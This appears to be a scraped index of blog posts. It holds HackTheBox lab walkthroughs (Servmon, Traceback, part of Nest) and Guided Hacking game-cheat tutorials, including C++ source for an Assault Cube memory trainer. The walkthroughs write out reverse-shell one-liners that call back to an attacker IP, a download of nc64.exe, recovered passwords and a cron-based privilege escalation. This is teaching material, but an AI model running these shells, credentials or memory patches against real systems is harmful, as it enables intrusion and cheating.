|_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5666/tcp open tcpwrapped 6699/tcp open napster? 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html | workers |_ jobs | http-title: NSClient++ |_Requested resource was /index.html 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.93%I=7%D=6/30%Time=649F154D%P=x86_64-pc-linux-gnu%r(GetR SF:equest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nCon SF:tent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xe SF:f\\xbb\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\ SF:x20Transitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-tra SF:nsitional\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtm SF:l\\\u0026#34;\u0026gt;\\r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;s SF:cript\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20w SF:indow\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20 SF:\u0026lt;/script\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(HTTPOption SF:s,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nContent- SF:Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xef\\xbb SF:\\xbf\u0026lt;!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\x20Tr SF:ansitional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-transiti SF:onal\\.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtml\\\u0026#34;\u0026gt;\\ SF:r\\n\u0026lt;head\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;script SF:\\x20type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20window SF:\\.location\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;/scr SF:ipt\u0026gt;\\r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(RTSPRequest,1B4 SF:,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20text/html\\r\\nContent-Lengt SF:h:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\\xef\\xbb\\xbf\u0026lt; SF:!DOCTYPE\\x20html\\x20PUBLIC\\x20\\\u0026#34;-//W3C//DTD\\x20XHTML\\x201\\.0\\x20Transit SF:ional//EN\\\u0026#34;\\x20\\\u0026#34;http://www\\.w3\\.org/TR/xhtml1/DTD/xhtml1-transitional\\ SF:.dtd\\\u0026#34;\u0026gt;\\r\\n\\r\\n\u0026lt;html\\x20xmlns=\\\u0026#34;http://www\\.w3\\.org/1999/xhtml\\\u0026#34;\u0026gt;\\r\\n\u0026lt;h SF:ead\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;title\u0026gt;\u0026lt;/title\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;script\\x20t SF:ype=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\\r\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20window\\.loc SF:ation\\.href\\x20=\\x20\\\u0026#34;Pages/login\\.htm\\\u0026#34;;\\r\\n\\x20\\x20\\x20\\x20\u0026lt;/script\u0026gt;\\ SF:r\\n\u0026lt;/head\u0026gt;\\r\\n\u0026lt;body\u0026gt;\\r\\n\u0026lt;/body\u0026gt;\\r\\n\u0026lt;/html\u0026gt;\\r\\n\u0026#34;)%r(X11Probe,6B,\u0026#34;HTTP/1\\ SF:.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/html\\r\\nConten SF:t-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n\\r\\n\u0026#34;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=6/30%Time=649F1554%P=x86_64-pc-linux-gn SF:u%r(GetRequest,74,\u0026#34;HTTP/1\\.1\\x20302\\r\\nContent-Length:\\x200\\r\\nLocation SF::\\x20/index\\.html\\r\\n\\r\\n\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0 SF:\\0\\0\\0\\0\\0\\0\\x12\\x02\\x18\\0\\x1aE\\n\\x07workers\\x12\\x0b\\n\\x04jobs\\x12\\x03\\ SF:x18\\xcb\\x01\\x12\u0026#34;)%r(HTTPOptions,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Length: SF:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;)%r(FourOhFourRequest,36,\u0026#34;HTTP/1 SF:\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;)%r SF:(RTSPRequest,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Length:\\x2018\\r\\n\\r\\nDocum SF:ent\\x20not\\x20found\u0026#34;)%r(SIPOptions,36,\u0026#34;HTTP/1\\.1\\x20404\\r\\nContent-Leng SF:th:\\x2018\\r\\n\\r\\nDocument\\x20not\\x20found\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -30s | smb2-security-mode: | 311: |_ Message signing enabled but not required | smb2-time: | date: 2023-06-30T17:49:24 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 156.40 seconds Web servers FTP No results with SMB gobuster Had an error with random strings Found nothing by ignoring those cases â””â”€$ gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.184 [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/30 19:18:38 Starting gobuster in directory enumeration mode =============================================================== Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.10.184/a11ab52c-c6be-4d66-bee8-f749550de92e =\u0026gt; 200 (Length: 118). To continue please exclude the status code or the length â””â”€$ gobuster dir -u http://10.10.10.184 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 --exclude-length 118 --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.184 [+] Method: GET [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 118 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/30 19:19:46 Starting gobuster in directory enumeration mode =============================================================== Foothold/User Searchsploit We saw a note which stated that there is a passwords file at c:\\users\\nathan\\desktop Let\u0026rsquo;s leverage the directory traversal exploit to retrieve that file\u0026rsquo;s content We know that we have 3 users: Administrator, Nathan, Nadine Let\u0026rsquo;s check if any of the found passwords for any of these users crackmapexec smb 10.10.10.184 -u user.list -p passwd.list Match nadine:L1k3B1gBut7s@W0rk Connect via ssh Root Searchsploit When I was enumerating port 8443 there was an exploit for privesc Let\u0026rsquo;s check NSClient++ We found password and allowed hosts in nsclient.ini ew2x6SsGTxjRwXOT Let\u0026rsquo;s configure port forwarding and access page using found password I check the exploit, but it was way simpler to add a new script and execute it to get a reverse shell We need to upload nc.exe to the box: powershell wget http://10.10.16.7:8000/nc64.exe -outfile nc.exe Now we need to go to Settings \u0026gt; external scripts \u0026gt; scripts \u0026gt; Add a simple script Setup a listener and create script ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/servmon/images/servmon.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/servmon/","summary":"Servmon Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.184 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-30 18:47 BST Nmap scan report for 10.10.10.184 (10.10.10.184) Host is up (0.14s latency). Not shown: 991 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-syst: |_ SYST: Windows_NT | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_02-28-22 07:35PM \u0026lt;DIR\u0026gt; Users 22/tcp open ssh OpenSSH for_Windows_8.0 (protocol 2.","tags":["HTB"],"title":"[HTB] Machine: Servmon"},{"categories":null,"contents":"Traceback Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.181 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 14:42 BST Nmap scan report for 10.10.10.181 (10.10.10.181) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9625518e6c830748ce114b1fe56d8a28 (RSA) | 256 54bd467114bdb242a1b6b02d94143b0d (ECDSA) |_ 256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.58 seconds Web server Since we have a hint that there is a web shell left We can the following list gobuster â””â”€$ gobuster dir -u http://10.10.10.181 -w ./php-shells.txt -t 50 =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.181 [+] Method: GET [+] Threads: 50 [+] Wordlist: ./php-shells.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Timeout: 10s =============================================================== 2023/06/29 16:39:39 Starting gobuster in directory enumeration mode =============================================================== /smevk.php (Status: 200) [Size: 1261] Progress: 847 / 848 (99.88%) =============================================================== 2023/06/29 16:39:46 Finished =============================================================== Foothold Web shell Let\u0026rsquo;s try default creds Let\u0026rsquo;s get a reverse shell Enter bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.7/6666 0\u0026gt;\u0026amp;1' to Execute field User Found a note inside home folder Also have sudo rights as sysadmin to execute luvit Since we are tracing the path of the attacker Checking the .bash_history reveals the privesc path We can try writing our key to authorized_keys Let\u0026rsquo;s write a script And run it as sysadmin ssh to box as sysadmin using the key Root After running linpeas, I launched pspy Found a cronjob that restores the contents of /etc/update-motd.d/ They are owned by sysadmin group We saw that the ssh banner was changed According to man page executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) --lsbsysinit option basically alphabetical order, with a few caveats). We can append reverse shell into one of these files Let\u0026rsquo;s try it echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.7 7777 \u0026gt;/tmp/f' \u0026gt;\u0026gt; 00-header Launch a listener and connect as sysadmin Rooted ","date":"June 29, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/traceback/images/traceback.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/traceback/","summary":"Traceback Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.181 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 14:42 BST Nmap scan report for 10.10.10.181 (10.10.10.181) Host is up (0.16s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 9625518e6c830748ce114b1fe56d8a28 (RSA) | 256 54bd467114bdb242a1b6b02d94143b0d (ECDSA) |_ 256 4dc3f852b885ec9c3e4d572c4a82fd86 (ED25519) 80/tcp open http Apache httpd 2.","tags":["HTB"],"title":"[HTB] Machine: Traceback"},{"categories":null,"contents":"DLL Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Simple C++ DLL Injector Source Code Tutorial Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/dll-injector/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/dll-injector/","summary":"DLL Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Simple C++ DLL Injector Source Code Tutorial Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] DLL Injector"},{"categories":null,"contents":"External Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project The following mini-project is walkthrough from Guided Hacking You can check the videos linked below in the references Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET Source Code Structure Folder View Solution View Proc proc.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace proc { DWORD GetProcId(const wchar_t* procName); uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName); uintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets); } proc.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;proc.h\u0026#34; DWORD proc::GetProcId(const wchar_t* procName) { DWORD procId = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (hSnap != INVALID_HANDLE_VALUE) { PROCESSENTRY32 procEntry; procEntry.dwSize = sizeof(procEntry); if (Process32First(hSnap, \u0026amp;procEntry)) { do { if (!_wcsicmp(procEntry.szExeFile, procName)) { procId = procEntry.th32ProcessID; break; } } while (Process32Next(hSnap, \u0026amp;procEntry)); } } CloseHandle(hSnap); return procId; } uintptr_t proc::GetModuleBaseAddress(DWORD procId, const wchar_t* modName) { uintptr_t modBaseAddr = 0; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procId); if (hSnap != INVALID_HANDLE_VALUE) { MODULEENTRY32 modEntry; modEntry.dwSize = sizeof(modEntry); if (Module32First(hSnap, \u0026amp;modEntry)) { do { if (!_wcsicmp(modEntry.szModule, modName)) { modBaseAddr = (uintptr_t)modEntry.modBaseAddr; break; } } while (Module32Next(hSnap, \u0026amp;modEntry)); } } CloseHandle(hSnap); return modBaseAddr; } uintptr_t proc::FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets) { uintptr_t addr = ptr; for (unsigned int i = 0; i \u0026lt; offsets.size(); ++i) { ReadProcessMemory(hProc, (BYTE*)addr, \u0026amp;addr, sizeof(addr), 0); addr += offsets[i]; } return addr; } Mem mem.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace mem { void PatchEx(BYTE* dst, BYTE* src, unsigned int size, HANDLE hProcess); void NopEx(BYTE* dst, unsigned int size, HANDLE hProcess); } mem.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;mem.h\u0026#34; void mem::PatchEx(BYTE* dst, BYTE* src, unsigned int size, HANDLE hProcess) { DWORD oldProtect; VirtualProtectEx(hProcess, dst, size, PAGE_EXECUTE_READWRITE, \u0026amp;oldProtect); WriteProcessMemory(hProcess, dst, src, size, nullptr); VirtualProtectEx(hProcess, dst, size, oldProtect, \u0026amp;oldProtect); } void mem::NopEx(BYTE* dst, unsigned int size, HANDLE hProcess) { BYTE* nopArray = new BYTE[size]; memset(nopArray, 0x90, size); PatchEx(dst, nopArray, size, hProcess); delete[] nopArray; } Header Files stdafx.h #pragma once #include \u0026#34;targetver.h\u0026#34; #include \u0026lt;iostream\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;Windows.h\u0026gt; #include \u0026lt;TlHelp32.h\u0026gt; targetver.h #pragma once // Including SDKDDKVer.h defines the highest available Windows platform. // If you wish to build your application for a previous Windows platform, include WinSDKVer.h and // set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h. #include \u0026lt;SDKDDKVer.h\u0026gt; Source Files stdafx.cpp #include \u0026#34;stdafx.h\u0026#34; assaultcube_external_trainer.cpp #include \u0026#34;stdafx.h\u0026#34; #include \u0026#34;proc/proc.h\u0026#34; #include \u0026#34;mem/mem.h\u0026#34; int main() { HANDLE hProcess = 0; uintptr_t moduleBase = 0, localPlayerPtr = 0, healthAddr = 0; bool bHealth = false, bAmmo = false, bRecoil = false; const int newValue = 1337; //Get ProcId of the target process DWORD procId = proc::GetProcId(L\u0026#34;ac_client.exe\u0026#34;); if (procId) { //Get Handle to Process hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, procId); //Getmodulebaseaddress moduleBase = proc::GetModuleBaseAddress(procId, L\u0026#34;ac_client.exe\u0026#34;); //Resolve address localPlayerPtr = moduleBase + 0x10f4f4; //Resolve base address of the pointer chain healthAddr = proc::FindDMAAddy(hProcess, localPlayerPtr, { 0xF8 }); } else { std::cout \u0026lt;\u0026lt; \u0026#34;Process not found, press enter to exit\\n\u0026#34;; return 0; } DWORD dwExit = 0; while (GetExitCodeProcess(hProcess, \u0026amp;dwExit) \u0026amp;\u0026amp; dwExit == STILL_ACTIVE) { //Health continuous write if (GetAsyncKeyState(VK_F1) \u0026amp; 1) { bHealth = !bHealth; } //unlimited ammo patch if (GetAsyncKeyState(VK_F2) \u0026amp; 1) { bAmmo = !bAmmo; if (bAmmo) { //FF 06 = inc [esi] mem::PatchEx((BYTE*)(moduleBase + 0x637e9), (BYTE*)\u0026#34;\\xFF\\x06\u0026#34;, 2, hProcess); } else { //FF 0E = dec [esi] mem::PatchEx((BYTE*)(moduleBase + 0x637e9), (BYTE*)\u0026#34;\\xFF\\x0E\u0026#34;, 2, hProcess); } } //no recoil NOP if (GetAsyncKeyState(VK_F3) \u0026amp; 1) { bRecoil = !bRecoil; if (bRecoil) { mem::NopEx((BYTE*)(moduleBase + 0x63786), 10, hProcess); } else { //50 8D 4C 24 1C 51 8B CE FF D2; the original stack setup and call mem::PatchEx((BYTE*)(moduleBase + 0x63786), (BYTE*)\u0026#34;\\x50\\x8D\\x4C\\x24\\x1C\\x51\\x8B\\xCE\\xFF\\xD2\u0026#34;, 10, hProcess); } } if (GetAsyncKeyState(VK_F4) \u0026amp; 1) { return 0; } //Continuous write if (bHealth) { mem::PatchEx((BYTE*)healthAddr, (BYTE*)\u0026amp;newValue, sizeof(newValue), hProcess); } Sleep(10); } std::cout \u0026lt;\u0026lt; \u0026#34;Process not found, press enter to exit\\n\u0026#34;; return 0; } Explanation TBA Proc and Mem source files Proc Mem Cheat Engine Reversing Recoil References Part 1 Part 2 Precompiled headers Recoil RE ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/external-trainer/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/external-trainer/","summary":"External Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project The following mini-project is walkthrough from Guided Hacking You can check the videos linked below in the references Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET Source Code Structure Folder View Solution View Proc proc.h #pragma once #include \u0026#34;stdafx.h\u0026#34; namespace proc { DWORD GetProcId(const wchar_t* procName); uintptr_t GetModuleBaseAddress(DWORD procId, const wchar_t* modName); uintptr_t FindDMAAddy(HANDLE hProc, uintptr_t ptr, std::vector\u0026lt;unsigned int\u0026gt; offsets); } proc.","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] External Trainer"},{"categories":null,"contents":"Internal Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET References Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/internal-trainer/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/internal-trainer/","summary":"Internal Trainer Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project Software Assault Cube 1.2.0.2 Cheat Engine Visual Studio Community ReClass.NET References Internal YOUR FIRST INTERNAL - BHOP HACK Malware Development II: Process Injection I\u0026rsquo;m in ur address space Getting good at SNES games through DLL injection ","tags":["Guided Hacking","Game Hacking"],"title":"[Guided Hacking] Internal Trainer"},{"categories":null,"contents":"Shellcodecode Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Part 1 Part 2 Part 3 Part 4 Part 5 ","date":"June 26, 2023","hero":"/posts/cybersecurity/guided-hacking/shellcode-injector/images/gh.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/guided-hacking/shellcode-injector/","summary":"Shellcodecode Injector Checkout official Guided Hacking website for more tutorials Checkout official Guided Hacking Youtube channel Project References Part 1 Part 2 Part 3 Part 4 Part 5 ","tags":["Guided Hacking"],"title":"[Guided Hacking] Shellcodecode Injector"},{"categories":null,"contents":"Nest Enumeration nmap â””â”€$ nmap -sC -sV -Pn 10.10.10.178 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-04 19:24 BST Nmap scan report for 10.10.10.178 (10.10.10.178) Host is up (0.10s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR \u0026lt;Directory_Name\u0026gt; | RUNQUERY \u0026lt;Query_ID\u0026gt; | DEBUG \u0026lt;Password\u0026gt; |_ HELP \u0026lt;Command\u0026gt; 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4386-TCP:V=7.93%I=7%D=7/4%Time=64A463FC%P=x86_64-pc-linux-gnu%r(NUL SF:L,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(GenericLine SF:s,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised SF:\\x20command\\r\\n\u0026gt;\u0026#34;)%r(GetRequest,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20 SF:V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(HTTPOptions,3A,\u0026#34;\\r\\n SF:HQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20comman SF:d\\r\\n\u0026gt;\u0026#34;)%r(RTSPRequest,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n SF:\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(RPCCheck,21,\u0026#34;\\r\\nHQK\\x20Repor SF:ting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(DNSVersionBindReqTCP,21,\u0026#34;\\r\\nHQK\\ SF:x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(DNSStatusRequestTCP,21,\u0026#34;\\ SF:r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(Help,F2,\u0026#34;\\r\\nHQK\\x SF:20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nThis\\x20service\\x20allows\\x SF:20users\\x20to\\x20run\\x20queries\\x20against\\x20databases\\x20using\\x20the SF:\\x20legacy\\x20HQK\\x20format\\r\\n\\r\\n---\\x20AVAILABLE\\x20COMMANDS\\x20---\\ SF:r\\n\\r\\nLIST\\r\\nSETDIR\\x20\u0026lt;Directory_Name\u0026gt;\\r\\nRUNQUERY\\x20\u0026lt;Query_ID\u0026gt;\\r\\n SF:DEBUG\\x20\u0026lt;Password\u0026gt;\\r\\nHELP\\x20\u0026lt;Command\u0026gt;\\r\\n\u0026gt;\u0026#34;)%r(SSLSessionReq,21,\u0026#34;\\r\\ SF:nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TerminalServerCookie SF:,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TLSSessionRe SF:q,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(Kerberos,21 SF:,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(SMBProgNeg,21,\u0026#34; SF:\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(X11Probe,21,\u0026#34;\\r\\n SF:HQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(FourOhFourRequest,3A, SF:\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20c SF:ommand\\r\\n\u0026gt;\u0026#34;)%r(LPDString,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\ SF:r\\n\\r\\n\u0026gt;\u0026#34;)%r(LDAPSearchReq,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2 SF:\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(LDAPBindReq,21,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\ SF:r\\n\\r\\n\u0026gt;\u0026#34;)%r(SIPOptions,3A,\u0026#34;\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\ SF:n\\r\\n\u0026gt;\\r\\nUnrecognised\\x20command\\r\\n\u0026gt;\u0026#34;)%r(LANDesk-RC,21,\u0026#34;\\r\\nHQK\\x20Re SF:porting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;)%r(TerminalServer,21,\u0026#34;\\r\\nHQK\\x20 SF:Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u0026gt;\u0026#34;); Host script results: |_clock-skew: -32s | smb2-security-mode: | 210: |_ Message signing enabled but not required | smb2-time: | date: 